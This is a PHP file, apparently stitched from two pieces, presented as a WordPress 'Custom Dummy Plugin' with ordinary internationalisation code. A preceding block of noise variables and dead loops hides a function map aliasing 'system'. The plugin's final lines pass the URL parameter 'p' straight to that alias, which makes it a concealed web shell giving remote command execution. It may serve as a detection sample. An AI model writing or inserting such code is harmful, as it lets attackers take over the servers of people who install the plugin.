<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/*
Plugin Name: Custom Dummy Plugin
Plugin URI: https://wordpress.org/
Description: For testing purposes only.
Version: 1.0.0
Text Domain: custom-internationalized-plugin
*/

function custom_i18n_load_textdomain() {
	load_plugin_textdomain( 'custom-internationalized-plugin', false, dirname( plugin_basename( __FILE__ ) ) . '/languages' );
}

add_action( 'init', 'custom_i18n_load_textdomain' );

function custom_i18n_plugin_test() {
	return __( 'This is a dummy plugin', 'custom-internationalized-plugin' );
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>